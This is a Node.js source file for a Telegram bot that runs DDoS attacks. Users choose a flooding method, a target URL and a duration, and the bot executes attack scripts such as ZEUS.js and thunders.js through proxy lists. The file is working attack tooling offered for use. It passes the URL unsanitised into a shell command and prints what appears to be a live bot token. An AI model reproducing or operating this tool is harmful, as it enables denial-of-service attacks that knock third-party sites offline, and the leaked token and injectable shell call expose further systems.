const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');

const botTokenFileContent = fs.readFileSync('bot_token.txt', 'utf-8');
const botTokenMatch = botTokenFileContent.match(/BotToken\s*=\s*'(.*)'/);

if (!botTokenMatch || !botTokenMatch[1]) {
  console.error('Invalid format in bot_token.txt. Please use: BotToken = \'6975928870:AAE85TxEQKOl8VXSt0b6H3pJYfincAw0WBY\'');
  process.exit(1);
}

const botToken = botTokenMatch[1];
const bot = new TelegramBot(botToken, { polling: true });

const pendingCommands = {};

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;

  if (messageText === '/start') {
    bot.sendMessage(chatId, 'Bot started. Use /run to execute a command.');
  } else if (messageText === '/run') {
    const keyboard = {
      reply_markup: {
        keyboard: [
          ['HTTP', 'SPIKE', 'THUNDER'],
          ['GMFR', 'ZEUS'],
        ],
        one_time_keyboard: true,
      },
    };
    bot.sendMessage(chatId, 'Choose method:', keyboard);
    pendingCommands[chatId] = { step: 'method' };
  } else if (['HTTP', 'SPIKE', 'THUNDER', 'GMFR', 'ZEUS'].includes(messageText) && pendingCommands[chatId]?.step === 'method') {
    const method = messageText.toUpperCase();
    pendingCommands[chatId] = { step: 'url', method };
    bot.sendMessage(chatId, 'Enter URL:');
  } else if (pendingCommands[chatId]?.step === 'url') {
    const url = messageText;
    pendingCommands[chatId] = { step: 'time', method: pendingCommands[chatId].method, url };

    const keyboard = {
      reply_markup: {
        keyboard: [
          ['60', '120', '430'],
          ['1200', '5000'],
        ],
        one_time_keyboard: true,
      },
    };
    bot.sendMessage(chatId, 'Choose time (in seconds):', keyboard);
  } else if (pendingCommands[chatId]?.step === 'time' && ['60', '120', '430', '1200', '5000'].includes(messageText)) {
    const { method, url } = pendingCommands[chatId];
    const time = messageText;

    const initialResponseMessage = `DDOS BY GMFR444X \nTarget: ${url}\nTime: ${time}\nMethod: ${method}\nStatus: START`;
    bot.sendMessage(chatId, initialResponseMessage);

    let command;

    if (method === 'HTTP') {
      command = `node HTTP-RAW.js ${url} ${time}`;
    } else if (method === 'SPIKE') {
      command = `node spike.js ${url} 2500 ${time}`;
    } else if (method === 'ZEUS') {
      command = `node ZEUS.js ${url} ${time} 2500 2500 proxy.txt`;
    } else if (method === 'THUNDER') {
      command = `node thunders.js ${url} ${time} 2500 2500 proxy.txt 2500`;
    } else if (method === 'GMFR') {
      command = `node test.js ${url} ${time} 2500 2500 proxy.txt`;
    }

    exec(command, (error, stdout, stderr) => {
      if (error) {
        bot.sendMessage(chatId, `Error: ${error.message}`);
        return;
      }

      if (stderr) {
        bot.sendMessage(chatId, `Error: ${stderr}`);
        return;
      }

      const completionResponseMessage = `Target: ${url}\nTime: ${time}\nMethod: ${method}\nStatus: COMPLETED\n${stdout}`;
      bot.sendMessage(chatId, completionResponseMessage);
    });

    delete pendingCommands[chatId];
  } else {
    bot.sendMessage(chatId, 'Incorrect command format. Use /run or /start');
    delete pendingCommands[chatId];
  }
});
